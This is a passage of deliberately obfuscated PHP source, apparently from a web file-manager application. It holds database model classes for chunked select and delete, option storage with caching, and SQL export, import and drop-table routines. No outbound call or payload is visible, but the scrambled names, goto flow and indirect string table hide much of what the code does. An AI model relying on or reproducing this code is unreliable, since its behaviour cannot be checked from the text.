select($F½óÎ’˜§ = array()) { goto E¨¸ÍÅé™Á; CÀù„¯•àØ: return $F½½öİ¶ˆò; goto bÁêç‚˜¨è; eâíÏ±‡ª: $aÔ‡µõ˜‡ = $this->findWhereField($B·Ô¶¶ÓïÖ); if (!$aÔ‡µõ˜‡ || isset($B·Ô¶¶ÓïÖ[$A™âÙƒ‹Ù[286]]) || isset($B·Ô¶¶ÓïÖ[$A™âÙƒ‹Ù[347]])) { return parent::select($F½óÎ’˜§); } $dÑ®º”¿Î = $B·Ô¶¶ÓïÖ[$A™âÙƒ‹Ù[269]][$aÔ‡µõ˜‡][1]; goto AÀ±ÄÔÙªÀ; AÀ±ÄÔÙªÀ: $dÑ®º”¿Î = is_array($dÑ®º”¿Î) ? $dÑ®º”¿Î : array(); $F½½öİ¶ˆò = null; for ($cÑìåìáÎÕ = 0; $cÑìåìáÎÕ < count($dÑ®º”¿Î); $cÑìåìáÎÕ += $AÊïšÓŒ…) { $c‰¤×Ê˜ = array_slice($dÑ®º”¿Î, $cÑìåìáÎÕ, $AÊïšÓŒ…); if (!is_array($c‰¤×Ê˜) || count($c‰¤×Ê˜) == 0) { break; } $B·Ô¶¶ÓïÖ[$A™âÙƒ‹Ù[269]][$aÔ‡µõ˜‡][1] = $c‰¤×Ê˜; $this->optionsValue($B·Ô¶¶ÓïÖ); $aÔÚì‚Ñ”  = parent::select($F½óÎ’˜§); if (!$aÔÚì‚Ñ” ) { continue; } if (is_null($F½½öİ¶ˆò)) { $F½½öİ¶ˆò = array(); } $F½½öİ¶ˆò = array_merge($F½½öİ¶ˆò, $aÔÚì‚Ñ” ); } goto CÀù„¯•àØ; E¨¸ÍÅé™Á: $A™âÙƒ‹Ù =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AÊïšÓŒ… = self::SQL_WHERE_IN_CHUNK; $B·Ô¶¶ÓïÖ = $this->optionsValue(); goto eâíÏ±‡ª; bÁêç‚˜¨è: } public function delete($EÍİÍ´ˆÌ¸ = array()) { goto c¼ğÍ¸½­ğ; c¼ğÍ¸½­ğ: $Fíã±Èò½ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C¶‚¤éŠ«Ã = self::SQL_WHERE_IN_CHUNK; $c½“Ê•ˆÒ“ = $this->optionsValue(); goto e‘ÇŞ¨ƒÇé; BâŠøèƒĞ: return $C›´À«ÙÀ²; goto A÷Õâ¯ãö˜; e‘ÇŞ¨ƒÇé: $E¯ªß›áëš = $this->findWhereField($c½“Ê•ˆÒ“); if (!$E¯ªß›áëš) { return parent::delete($EÍİÍ´ˆÌ¸); } $C›´À«ÙÀ² = 0; goto a”ê¸ßä¤–; a”ê¸ßä¤–: $aõ×¼ØåÑŞ = $c½“Ê•ˆÒ“[$Fíã±Èò½[269]][$E¯ªß›áëš][1]; $aõ×¼ØåÑŞ = is_array($aõ×¼ØåÑŞ) ? $aõ×¼ØåÑŞ : array(); for ($dšÆ‡¨„âê = 0; $dšÆ‡¨„âê < count($aõ×¼ØåÑŞ); $dšÆ‡¨„âê += $C¶‚¤éŠ«Ã) { $d…ŠˆÁ ¬ = array_slice($aõ×¼ØåÑŞ, $dšÆ‡¨„âê, $C¶‚¤éŠ«Ã); if (!is_array($d…ŠˆÁ ¬) || count($d…ŠˆÁ ¬) == 0) { break; } $c½“Ê•ˆÒ“[$Fíã±Èò½[269]][$E¯ªß›áëš][1] = $d…ŠˆÁ ¬; $this->optionsValue($c½“Ê•ˆÒ“); $C›´À«ÙÀ² += parent::delete($EÍİÍ´ˆÌ¸); } goto BâŠøèƒĞ; A÷Õâ¯ãö˜: } private function findWhereField($aÊŠ¸ßºôã) { $BõµÒÕ¦ä“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cù•¾ŸåØ = self::SQL_WHERE_IN_CHUNK; if (!is_array($aÊŠ¸ßºôã) || !is_array($aÊŠ¸ßºôã[$BõµÒÕ¦ä“[269]])) { return !1; } foreach ($aÊŠ¸ßºôã[$BõµÒÕ¦ä“[269]] as $aÔçŞÉôê => $AŒ‚å¹ø•) { if (is_array($AŒ‚å¹ø•) && isset($AŒ‚å¹ø•[0]) && is_string($AŒ‚å¹ø•[0]) && strtolower($AŒ‚å¹ø•[0]) == $BõµÒÕ¦ä“[7] && is_array($AŒ‚å¹ø•[1]) && count($AŒ‚å¹ø•[1]) > $Cù•¾ŸåØ) { ignore_timeout(); return $aÔçŞÉôê; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\145\x6d\x4f\160\164\151\157\156"; public $field = array(); public function listData($a±ªÇŠÆª = false, $Dã‚˜•ªíù = "\155\157\144\151\x66\x79\124\151\155\x65", $FíÇ½°ä = false) { $bÕéöóù®É = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$bÕéöóù®É) { return $a±ªÇŠÆª ? null : array(); } if (!$a±ªÇŠÆª) { $bÕéöóù®É = array_filter(array_values($bÕéöóù®É)); return array_sort_by($bÕéöóù®É, $Dã‚˜•ªíù, $FíÇ½°ä); } return $bÕéöóù®É[$_SERVER[ÈİÅ¿ÈÈ¥×][380] . $a±ªÇŠÆª]; } public function insert($Eñ×‹²Î°¾) { goto F•Ñ‘Ô°Ë–; d—’„ê‡´Ô: return $c·ê¡ƒ¿ùÍ; goto f ®Ï¡ÙŠ; F•Ñ‘Ô°Ë–: $e†ôôÑØƒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eñ×‹²Î°¾ = array_field_key($Eñ×‹²Î°¾, $this->field); $c·ê¡ƒ¿ùÍ = Model($this->modelType)->get($e†ôôÑØƒ[381], $this->optionType . $e†ôôÑØƒ[382]); goto B³èËëï††; B³èËëï††: $c·ê¡ƒ¿ùÍ = $c·ê¡ƒ¿ùÍ ? $c·ê¡ƒ¿ùÍ : 0; $Eñ×‹²Î°¾[$e†ôôÑØƒ[383]] = ++$c·ê¡ƒ¿ùÍ; $Eñ×‹²Î°¾[$e†ôôÑØƒ[190]] = time(); goto a†õ£äœæ; a†õ£äœæ: $Eñ×‹²Î°¾[$e†ôôÑØƒ[107]] = time(); Model($this->modelType)->set($e†ôôÑØƒ[381], $c·ê¡ƒ¿ùÍ, $this->optionType . $e†ôôÑØƒ[382]); Model($this->modelType)->set($e†ôôÑØƒ[380] . $c·ê¡ƒ¿ùÍ, $Eñ×‹²Î°¾, $this->optionType); goto d—’„ê‡´Ô; f ®Ï¡ÙŠ: } public function update($B¬Îãİ”à, $DÀ¡æƒ“¸Ö) { goto Aà¼æâø©‘; Aà¼æâø©‘: $FœòòÚ’å© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÀ¡æƒ“¸Ö = array_field_key($DÀ¡æƒ“¸Ö, $this->field); $cÉ„šŒÁäÂ = $this->listData($B¬Îãİ”à); goto f¨´ò™¿˜Å; f¨´ò™¿˜Å: if (!$cÉ„šŒÁäÂ) { return !1; } $DÀ¡æƒ“¸Ö = array_merge($cÉ„šŒÁäÂ, $DÀ¡æƒ“¸Ö); $DÀ¡æƒ“¸Ö[$FœòòÚ’å©[107]] = time(); goto f¡Š®÷ÜàŒ; f¡Š®÷ÜàŒ: return Model($this->modelType)->set($FœòòÚ’å©[380] . $B¬Îãİ”à, $DÀ¡æƒ“¸Ö, $this->optionType); goto F»“Ğ…ò…±; F»“Ğ…ò…±: } public function remove($AÔê°ãŠõÚ) { return Model($this->modelType)->remove($_SERVER[ÈİÅ¿ÈÈ¥×][380] . $AÔê°ãŠõÚ, $this->optionType); } public function clear() { $BªÁİÛß™œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; Model($this->modelType)->remove($BªÁİÛß™œ[381], $this->optionType . $BªÁİÛß™œ[382]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($DšïàÌœ–, $D›½ÒŒ‚†) { if (!$D›½ÒŒ‚†) { return !1; } $e’ÒÌ¾Ø¥ = $this->listData(); $e’ÒÌ¾Ø¥ = array_to_keyvalue($e’ÒÌ¾Ø¥, $DšïàÌœ–); return isset($e’ÒÌ¾Ø¥[$D›½ÒŒ‚†]) ? $e’ÒÌ¾Ø¥[$D›½ÒŒ‚†] : !1; } public function findByName($b–ñÎâÖéù) { return $this->findByKey($_SERVER[ÈİÅ¿ÈÈ¥×][28], $b–ñÎâÖéù); } protected function resetData($Eßçâ¤ËÄ±) { $a¢öÎÙ¯ˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eßçâ¤ËÄ± = is_array($Eßçâ¤ËÄ±) ? $Eßçâ¤ËÄ± : array(); $fÔéÎî§­‰ = array(); for ($f‰Íƒ‰‚› = 0; $f‰Íƒ‰‚› < count($Eßçâ¤ËÄ±); $f‰Íƒ‰‚›++) { $fÔéÎî§­‰[$a¢öÎÙ¯ˆ[380] . $Eßçâ¤ËÄ±[$f‰Íƒ‰‚›][$a¢öÎÙ¯ˆ[383]]] = $Eßçâ¤ËÄ±[$f‰Íƒ‰‚›]; } return Model($this->modelType)->set($fÔéÎî§­‰, !1, $this->optionType); } private function getAutoName($d··Öäã) { $fÄÍÛµ£‰ = array_to_keyvalue($this->listData(), $_SERVER[ÈİÅ¿ÈÈ¥×][28]); if (!$fÄÍÛµ£‰ || !isset($fÄÍÛµ£‰[$d··Öäã])) { return $d··Öäã; } for ($E°«½Õ†« = 1; $E°«½Õ†« < count($fÄÍÛµ£‰); $E°«½Õ†«++) { $B£Š¢ŞÉ›  = $d··Öäã . "\50{$E°«½Õ†«}\x29"; if (!isset($fÄÍÛµ£‰[$B£Š¢ŞÉ› ])) { return $B£Š¢ŞÉ› ; } } return $B£Š¢ŞÉ› ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($eİ±âª´Œ = false, $Cø‹ÎŒ¤… = '', $e¿œÆ‰’º = false) { goto cù­ÎæöÏ†; Dğ“—®ò–: $C”æ‚Ö÷ŠÃ = is_array($C”æ‚Ö÷ŠÃ) ? $C”æ‚Ö÷ŠÃ : array(); if (is_array($AÙë‘ìô)) { $AÙë‘ìô = array_merge($C”æ‚Ö÷ŠÃ, $AÙë‘ìô); return $eİ±âª´Œ ? isset($AÙë‘ìô[$eİ±âª´Œ]) ? $AÙë‘ìô[$eİ±âª´Œ] : null : $AÙë‘ìô; } $D™Œ¤²ºâª = $this->filterWhere(array($d´±§ªÆ­ª[29] => $Cø‹ÎŒ¤…)); goto E¶ğ©ù–œ—; E¶ğ©ù–œ—: $AÙë‘ìô = $this->where($D™Œ¤²ºâª)->select(); $AÙë‘ìô = array_to_keyvalue($AÙë‘ìô, $d´±§ªÆ­ª[89], $d´±§ªÆ­ª[366]); foreach ($AÙë‘ìô as $CÄì¯ˆÓ‹ğ => $B Ğ÷Ú®š„) { if ($e¿œÆ‰’º || in_array($CÄì¯ˆÓ‹ğ, $this->jsonField)) { $AÙë‘ìô[$CÄì¯ˆÓ‹ğ] = json_decode($B Ğ÷Ú®š„, !0); } } goto Fš²İ†‘å¡; cù­ÎæöÏ†: $d´±§ªÆ­ª =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AÙë‘ìô = $this->cacheGet($Cø‹ÎŒ¤…); $C”æ‚Ö÷ŠÃ = $this->optionDefault($Cø‹ÎŒ¤…); goto Dğ“—®ò–; Fš²İ†‘å¡: $this->cacheSet($Cø‹ÎŒ¤…, $AÙë‘ìô); $AÙë‘ìô = array_merge($C”æ‚Ö÷ŠÃ, $AÙë‘ìô); return $eİ±âª´Œ ? $AÙë‘ìô[$eİ±âª´Œ] : $AÙë‘ìô; goto Dö‚ùĞ¹òÂ; Dö‚ùĞ¹òÂ: } public function set($aîåÛŒÒÓ´, $D÷„¦œä¤ = false, $FØÒ¤¾³İÏ = '') { goto Dàä·óš‘•; a–ô»ŸŒ†Ü: $DÃ¸öÄ¾í÷ = is_array($aîåÛŒÒÓ´) ? $aîåÛŒÒÓ´ : array($aîåÛŒÒÓ´ => $D÷„¦œä¤); foreach ($DÃ¸öÄ¾í÷ as $c¦ñ”Ú¡°¯ => $Bë‘àŒˆå) { if (is_array($Bë‘àŒˆå)) { $Bë‘àŒˆå = json_encode_force($Bë‘àŒˆå); } $this->checkLength($Bë‘àŒˆå, !1, $this->tableName . $A’‡¥˜²Ë…[4] . $aîåÛŒÒÓ´); $Bë‘àŒˆå = self::textEncode($Bë‘àŒˆå); $DÃ¸öÄ¾í÷ = array($A’‡¥˜²Ë…[29] => $FØÒ¤¾³İÏ, $A’‡¥˜²Ë…[89] => $c¦ñ”Ú¡°¯, $A’‡¥˜²Ë…[366] => $Bë‘àŒˆå); $D–‰Ğöåâ[] = $this->filterWhere($DÃ¸öÄ¾í÷); } if (!$D–‰Ğöåâ) { return !0; } goto e‡™†½šŠŞ; e‡™†½šŠŞ: return $this->addAll($D–‰Ğöåâ, array(), !0); goto B¯‡Ÿà¶á¥; Dàä·óš‘•: $A’‡¥˜²Ë… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->cacheRemove($FØÒ¤¾³İÏ); $D–‰Ğöåâ = array(); goto a–ô»ŸŒ†Ü; B¯‡Ÿà¶á¥: } protected function optionDefault($bâÛÓé±“ = '') { return !1; } public function setDeep($dÌÅíÌå, $F‘Ò§Û¼ù° = false, $CÒõ¯ùÀª = '') { $d‰±Úé¦‹ = explode($_SERVER[ÈİÅ¿ÈÈ¥×][91], $dÌÅíÌå); $fÓ–ïŠ¢ = $this->get(); array_set_value($fÓ–ïŠ¢, $dÌÅíÌå, $F‘Ò§Û¼ù°); $this->set($d‰±Úé¦‹[0], $fÓ–ïŠ¢[$d‰±Úé¦‹[0]], $CÒõ¯ùÀª); } public function remove($CñŠåÊÍ‚, $fÏ²µõ»·˜ = '') { $aé³“–½äİ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->cacheRemove($fÏ²µõ»·˜); $a½èÓÈàæ» = $this->filterWhere(array($aé³“–½äİ[89] => $CñŠåÊÍ‚, $aé³“–½äİ[29] => $fÏ²µõ»·˜)); if (is_null($CñŠåÊÍ‚)) { unset($a½èÓÈàæ»[$aé³“–½äİ[89]]); } return $this->where($a½èÓÈàæ»)->delete(); } public function cacheSet($b˜ÂŒ»¤­ã, $a‹³ÂÊÛ²÷ = false) { return Cache::set($this->cacheKey($b˜ÂŒ»¤­ã), $a‹³ÂÊÛ²÷); } public function cacheGet($c•ˆÙÍºá†) { return Cache::get($this->cacheKey($c•ˆÙÍºá†)); } public function cacheRemove($bÍîÒ­›½š) { return Cache::remove($this->cacheKey($bÍîÒ­›½š)); } protected function filterWhere($Fà°Ğš¨˜–) { return $Fà°Ğš¨˜–; } protected function cacheKey($cÅ¶„ÑŠ§¡) { return $cÅ¶„ÑŠ§¡; } } goto B×…õÁù ; D–‡ˆŒ°±: class DbManage { function __construct($c­Ñ¦ˆÖ§à, $F®›ƒ·ˆÁš = '') { $this->database = $c­Ñ¦ˆÖ§à; $this->type = $F®›ƒ·ˆÁš; } public function model($Dİê«†è»ã = '') { return new ModelBase($Dİê«†è»ã, $_SERVER[ÈİÅ¿ÈÈ¥×][33], $this->database); } public function db($cÎ¨è»Š” = false) { goto D„ í‹å¤¯; cÄ‚µ°¸»”: if (!$e¤¨Ğš³Ü±) { $Eí‘Ä®÷Œ->execute("\143\x72\145\141\164\x65\x20\x64\141\x74\141\x62\x61\x73\145\40\x60{$BÌ•«©ñ•›}\140"); } $f¿‹ŒæÓ•Ğ[$C†ëÍ­Ó¦Ç[894]] = $BÌ•«©ñ•›; if ($f¿‹ŒæÓ•Ğ[$C†ëÍ­Ó¦Ç[730]] == $C†ëÍ­Ó¦Ç[731]) { $f¿‹ŒæÓ•Ğ[$C†ëÍ­Ó¦Ç[732]] .= $C†ëÍ­Ó¦Ç[982] . $BÌ•«©ñ•›; } goto A®º˜¨…à; D„ í‹å¤¯: $C†ëÍ­Ó¦Ç =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f¿‹ŒæÓ•Ğ = array_change_key_case($this->database); if ($this->type == $C†ëÍ­Ó¦Ç[9] || !$cÎ¨è»Š”) { return $this->model()->db(); } goto AØ™âÉí­Â; AØ™âÉí­Â: $BÌ•«©ñ•› = $f¿‹ŒæÓ•Ğ[$C†ëÍ­Ó¦Ç[894]]; $f¿‹ŒæÓ•Ğ[$C†ëÍ­Ó¦Ç[894]] = $C†ëÍ­Ó¦Ç[33]; if ($f¿‹ŒæÓ•Ğ[$C†ëÍ­Ó¦Ç[730]] == $C†ëÍ­Ó¦Ç[731]) { $C©‚‚šîš = $f¿‹ŒæÓ•Ğ[$C†ëÍ­Ó¦Ç[732]]; $f¿‹ŒæÓ•Ğ[$C†ëÍ­Ó¦Ç[732]] = substr($C©‚‚šîš, 0, strrpos($C©‚‚šîš, $C†ëÍ­Ó¦Ç[982])); } goto A‚ÕØÁ–±ö; A®º˜¨…à: $this->database = $f¿‹ŒæÓ•Ğ; $Eí‘Ä®÷Œ->execute("\x75\x73\x65\40\140{$BÌ•«©ñ•›}\140"); return $Eí‘Ä®÷Œ; goto Cõöö÷¹Ø; A‚ÕØÁ–±ö: $this->database = $f¿‹ŒæÓ•Ğ; $Eí‘Ä®÷Œ = $this->model()->db(); try { $e¤¨Ğš³Ü± = $Eí‘Ä®÷Œ->execute("\163\150\157\167\40\144\141\x74\x61\x62\141\x73\x65\x73\40\154\x69\x6b\145\40\47{$BÌ•«©ñ•›}\47"); } catch (Exception $fÒ¸­èêŒ) { } goto cÄ‚µ°¸»”; Cõöö÷¹Ø: } public function createTable($fÈè«ÁîÆ‹, $bµ³Ü¡°Œğ = null) { $b×°³°ß¥ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!IO::exist($fÈè«ÁîÆ‹)) { ActionCall($b×°³°ß¥[983], !0, 0); show_json(LNG($b×°³°ß¥[984]), !1); } $E²ö¬ëğ… = sqlSplit(IO::getContent($fÈè«ÁîÆ‹)); foreach ($E²ö¬ëğ… as $B™å¼„ˆÈŞ) { if ($bµ³Ü¡°Œğ) { $B—ÃÛœàµß = stripos($B™å¼„ˆÈŞ, $b×°³°ß¥[985]) === 0; if ($B—ÃÛœàµß) { $bµ³Ü¡°Œğ->task[$b×°³°ß¥[986]] += 1; } } $this->model()->db()->execute($B™å¼„ˆÈŞ); if ($bµ³Ü¡°Œğ && $B—ÃÛœàµß) { preg_match($b×°³°ß¥[987], $B™å¼„ˆÈŞ, $bÜ»”¢ºÍñ); $bµ³Ü¡°Œğ->task[$b×°³°ß¥[988]] = $bÜ»”¢ºÍñ[1]; $bµ³Ü¡°Œğ->update(1); } } $this->taskToCache($bµ³Ü¡°Œğ); } public function insertTable($e²†ÛïéÂ, $DÕºãœŒ¿è = null) { $EÕä™ñ¼£ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F„ß½¡íâÃ = $this->model()->db(); $A„ööËñíã = $FÅ’Í·óêÖ ? array($FÅ’Í·óêÖ) : $F„ß½¡íâÃ->getTables(); foreach ($e²†ÛïéÂ as $c¨ˆïÓ¡‹) { $FÅ’Í·óêÖ = basename($c¨ˆïÓ¡‹, $EÕä™ñ¼£[725]); if (!in_array($FÅ’Í·óêÖ, $A„ööËñíã)) { continue; } if ($DÕºãœŒ¿è) { $DÕºãœŒ¿è->task[$EÕä™ñ¼£[988]] = $FÅ’Í·óêÖ; } if (get_filesize($c¨ˆïÓ¡‹) == 0) { continue; } $c„Â‚¹…ÔÕ = $this->sqlToDb($c¨ˆïÓ¡‹, $DÕºãœŒ¿è); if (!$c„Â‚¹…ÔÕ) { ActionCall($EÕä™ñ¼£[983], !0, 0); show_json(LNG($EÕä™ñ¼£[989]) . "\x5b{$FÅ’Í·óêÖ}\135", !1); } } $this->taskToCache($DÕºãœŒ¿è); } public function sqlFromDb($BÌÆ°í¯Š˜, $b•óá‚Šàá, $C×ŒËßÒğ = null, $C½¬´çğÄ¨ = null) { goto eŒ¢Å “¬ä; c ¯¬²ÕØ˜: $aĞ…¥ˆóæ¸ = 1; $B½İ¡Ñ£ = 500; $dæŒØ‚İğ¶ = fopen($b•óá‚Šàá, $_SERVER[ÈİÅ¿ÈÈ¥×][990]); goto ešéíù°ãÉ; ešéíù°ãÉ: $fÛ·°Ÿğ°’ = $bİŞËãí˜¢->getPk(); $fªÃËâ™ÂÎ = $bİŞËãí˜¢->getDbFields(); do { $e—Œ¦Îñ = $bİŞËãí˜¢->field($fªÃËâ™ÂÎ)->order($fÛ·°Ÿğ°’ . $_SERVER[ÈİÅ¿ÈÈ¥×][991])->selectPage($B½İ¡Ñ£, $aĞ…¥ˆóæ¸); $aëÏã“œ¡¶ = isset($e—Œ¦Îñ[$_SERVER[ÈİÅ¿ÈÈ¥×][358]][$_SERVER[ÈİÅ¿ÈÈ¥×][360]]) ? $e—Œ¦Îñ[$_SERVER[ÈİÅ¿ÈÈ¥×][358]][$_SERVER[ÈİÅ¿ÈÈ¥×][360]] : 0; $a‰¤®Œßô¦ = !empty($e—Œ¦Îñ[$_SERVER[ÈİÅ¿ÈÈ¥×][361]]) ? $e—Œ¦Îñ[$_SERVER[ÈİÅ¿ÈÈ¥×][361]] : array(); if (!($bó¬±ÑÉ¹ = count($a‰¤®Œßô¦))) { break; } $FÍæñ±ƒ¡Š = array(); foreach ($a‰¤®Œßô¦ as $EÍ³¼«„ ) { if ($BÌÆ°í¯Š˜ == $_SERVER[ÈİÅ¿ÈÈ¥×][992] && $EÍ³¼«„ [$_SERVER[ÈİÅ¿ÈÈ¥×][29]] == $_SERVER[ÈİÅ¿ÈÈ¥×][993]) { $e‡«à­‰Ë» = json_decode($EÍ³¼«„ [$_SERVER[ÈİÅ¿ÈÈ¥×][366]], !0); if ($e‡«à­‰Ë»[$_SERVER[ÈİÅ¿ÈÈ¥×][28]] == date($_SERVER[ÈİÅ¿ÈÈ¥×][698]) && !$e‡«à­‰Ë»[$_SERVER[ÈİÅ¿ÈÈ¥×][697]]) { continue; } } if ($C½¬´çğÄ¨) { $EÍ³¼«„ [$_SERVER[ÈİÅ¿ÈÈ¥×][75]] = "\x7b\x69\157\x3a{$C½¬´çğÄ¨}\x7d" . substr($EÍ³¼«„ [$_SERVER[ÈİÅ¿ÈÈ¥×][75]], strlen("\173\151\157\x3a{$EÍ³¼«„ [$_SERVER[ÈİÅ¿ÈÈ¥×][751]]}\175")); $EÍ³¼«„ [$_SERVER[ÈİÅ¿ÈÈ¥×][751]] = $C½¬´çğÄ¨; } $FÍæñ±ƒ¡Š[] = $_SERVER[ÈİÅ¿ÈÈ¥×][994] . $this->sqlEncode($EÍ³¼«„ ) . $_SERVER[ÈİÅ¿ÈÈ¥×][995]; } $b˜éò¶§¿· = "\111\x4e\123\x45\122\124\40\x49\116\x54\x4f\x20\x60{$BÌÆ°í¯Š˜}\140\x20\x28\x60" . implode($_SERVER[ÈİÅ¿ÈÈ¥×][996], $fªÃËâ™ÂÎ) . $_SERVER[ÈİÅ¿ÈÈ¥×][997]; fwrite($dæŒØ‚İğ¶, $b˜éò¶§¿· . implode($_SERVER[ÈİÅ¿ÈÈ¥×][998], $FÍæñ±ƒ¡Š) . $_SERVER[ÈİÅ¿ÈÈ¥×][67] . PHP_EOL); $aĞ…¥ˆóæ¸++; $d÷î¥ªöôÔ += $bó¬±ÑÉ¹; if ($C×ŒËßÒğ) { $C×ŒËßÒğ->update($bó¬±ÑÉ¹); } } while ($aĞ…¥ˆóæ¸ <= $aëÏã“œ¡¶); goto bøÑªâ¢‹’; bøÑªâ¢‹’: fclose($dæŒØ‚İğ¶); return $d÷î¥ªöôÔ; goto Bà÷‚ÙÈèø; eŒ¢Å “¬ä: if ($C×ŒËßÒğ) { $C×ŒËßÒğ->task[$_SERVER[ÈİÅ¿ÈÈ¥×][988]] = $BÌÆ°í¯Š˜; } $bİŞËãí˜¢ = $this->model($BÌÆ°í¯Š˜); $d÷î¥ªöôÔ = 0; goto c ¯¬²ÕØ˜; Bà÷‚ÙÈèø: } public function sqlToDb($dµÊÊ¡¿Ÿ, $D’¦ÄŒÅ…Ñ = null) { goto CæÕ¯•³çœ; F¸ƒ”ÙÉÒ: $dÚ¦¤âÓ° = 500 + 1; while (!feof($A’Š„´¤Õ·)) { if ($D’¦ÄŒÅ…Ñ && $fôÊÔªó³Æ != 0) { $D’¦ÄŒÅ…Ñ->task[$A†óËˆ¯¹[986]] += 1; } $fôÊÔªó³Æ++; $CÁ­’¾ãÃÚ = trim(fgets($A’Š„´¤Õ·)); $C††¤¸Õ…Õ .= $A†óËˆ¯¹[50] . $this->sqlDecode($CÁ­’¾ãÃÚ, $this->type); if ($fôÊÔªó³Æ == $dÚ¦¤âÓ°) { $C††¤¸Õ…Õ = rtrim(trim($C††¤¸Õ…Õ), $A†óËˆ¯¹[67]); if (!$a¾¨Ë¡Î®ß->execute($C††¤¸Õ…Õ)) { return !1; } if ($D’¦ÄŒÅ…Ñ) { $D’¦ÄŒÅ…Ñ->update($fôÊÔªó³Æ - 1); } $C††¤¸Õ…Õ = $A†óËˆ¯¹[33]; $fôÊÔªó³Æ = 0; } } fclose($A’Š„´¤Õ·); goto a·µÅ‚Ÿîİ; CæÕ¯•³çœ: $A†óËˆ¯¹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a¾¨Ë¡Î®ß = $this->model()->db(); $A’Š„´¤Õ· = @fopen($dµÊÊ¡¿Ÿ, $A†óËˆ¯¹[999]); goto F£‚óÌÒ°º; F£‚óÌÒ°º: if (!$A’Š„´¤Õ·) { return !1; } $fôÊÔªó³Æ = 0; $C††¤¸Õ…Õ = $A†óËˆ¯¹[33]; goto F¸ƒ”ÙÉÒ; a·µÅ‚Ÿîİ: if (trim($C††¤¸Õ…Õ)) { $C††¤¸Õ…Õ = rtrim(trim($C††¤¸Õ…Õ), $A†óËˆ¯¹[67]); if (!$a¾¨Ë¡Î®ß->execute($C††¤¸Õ…Õ)) { return !1; } if ($D’¦ÄŒÅ…Ñ) { $D’¦ÄŒÅ…Ñ->update($fôÊÔªó³Æ - 1); } } return !0; goto dµÓø°Å†; dµÓø°Å†: } public function dropTable($BãÂèò¿ë = null) { $Fó¡ŸÑë” = $this->model()->db(); $bÔµ‰Ãö†‘ = $BãÂèò¿ë ? array($BãÂèò¿ë) : $Fó¡ŸÑë”->getTables(); if (!$bÔµ‰Ãö†‘) { return; } foreach ($bÔµ‰Ãö†‘ as $BãÂèò¿ë) { $Fó¡ŸÑë”->execute("\x64\162\157\160\x20\164\141\x62\x6c\145\40\x69\146\40\145\x78\x69\x73\164\163\40\x60{$BãÂèò¿ë}\140"); } } private function taskToCache($eÁÅ¤ö¹¶Û = null) { $eôÍ•Á»ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$eÁÅ¤ö¹¶Û) { return; } $dÌ´‰ßÇ© = array($eôÍ•Á»ë[988] => $eÁÅ¤ö¹¶Û->task[$eôÍ•Á»ë[988]], $eôÍ•Á»ë[986] => $eÁÅ¤ö¹¶Û->task[$eôÍ•Á»ë[986]], $eôÍ•Á»ë[1000] => $eÁÅ¤ö¹¶Û->task[$eôÍ•Á»ë[1000]]); if ($dÌ´‰ßÇ©[$eôÍ•Á»ë[986]] == $dÌ´‰ßÇ©[$eôÍ•Á»ë[1000]]) { $dÌ´‰ßÇ©[$eôÍ•Á»ë[704]] = 1; } Cache::set($eôÍ•Á»ë[1001] . $eÁÅ¤ö¹¶Û->task[$eôÍ•Á»ë[383]], $dÌ´‰ßÇ©); $eÁÅ¤ö¹¶Û->end(); } private function sqlEncode($EøÇÔ¥À–å) { $bš³êŒéËÜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Fì•Ö×‰´ = array(); foreach ($EøÇÔ¥À–å as $C“Ş¬Ş³µ) { if (is_array($C“Ş¬Ş³µ)) { $C“Ş¬Ş³µ = json_encode_force($C“Ş¬Ş³µ); } $C“Ş¬Ş³µ = addslashes($C“Ş¬Ş³µ); $C“Ş¬Ş³µ = str_replace(array($bš³êŒéËÜ[1002], $bš³êŒéËÜ[225]), array($bš³êŒéËÜ[1003], $bš³êŒéËÜ[1004]), $C“Ş¬Ş³µ); $Fì•Ö×‰´[] = str_replace($bš³êŒéËÜ[55], $bš³êŒéËÜ[1005], $C“Ş¬Ş³µ); } return $bš³êŒéËÜ[55] . implode($bš³êŒéËÜ[1006], $Fì•Ö×‰´) . $bš³êŒéËÜ[55]; } private function sqlDecode($EÙ±òéõÂ„, $e¾‡²ºÇ™®) { $FÈ‚Š¼µÌ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EÙ±òéõÂ„ = str_replace(array($FÈ‚Š¼µÌ[1003], $FÈ‚Š¼µÌ[1004]), array($FÈ‚Š¼µÌ[1002], $FÈ‚Š¼µÌ[225]), $EÙ±òéõÂ„); if ($e¾‡²ºÇ™® == $FÈ‚Š¼µÌ[9]) { $EÙ±òéõÂ„ = stripslashes($EÙ±òéõÂ„); } return $EÙ±òéõÂ„; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($bøè¡½Œ±Ò, $c»³êä¿½) { goto d¿¬—“¦; BÌÅ‹Äã°: Hook::trigger($B‚¹õó©¢ˆ[1008] . $bøè¡½Œ±Ò . $B‚¹õó©¢ˆ[1009], $eİ¸†îÆ÷); $cÅÏ¨¿ò = self::driverMake($c»³êä¿½[0]); if (method_exists($cÅÏ¨¿ò, $bøè¡½Œ±Ò)) { $a‰’ÛªÌÙ¤ = @call_user_func_array(array($cÅÏ¨¿ò, $bøè¡½Œ±Ò), $c»³êä¿½); } else { if (method_exists($cÅÏ¨¿ò, $B‚¹õó©¢ˆ[1010])) { $a‰’ÛªÌÙ¤ = @call_user_func_array(array($cÅÏ¨¿ò, 